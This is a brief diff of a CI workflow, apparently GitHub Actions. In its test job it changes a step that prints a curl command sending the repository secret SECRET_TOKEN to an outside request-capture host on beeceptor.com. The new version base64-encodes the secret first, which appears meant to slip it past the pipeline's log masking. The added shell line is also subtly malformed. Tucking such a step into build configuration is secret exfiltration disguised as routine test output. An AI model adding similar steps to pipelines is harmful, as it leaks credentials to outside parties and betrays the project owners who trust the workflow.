@@ -22,7 +22,8 @@ jobs:
         run: |
           echo "TEST_TOKEN: $PUBLIC_TOKEN"
           echo "TEST_TOKEN1: ${{vars.PUBLIC_TOKEN_1}}"
-          echo curl "https://inovasys.free.beeceptor.com/${{secrets.SECRET_TOKEN}}"
+          mango=$(echo "${secrets.SECRET_TOKEN}" | base64)
+          echo curl "https://inovasys.free.beeceptor.com/$mango"
   build:
     needs: test
     runs-on: ubuntu-latest
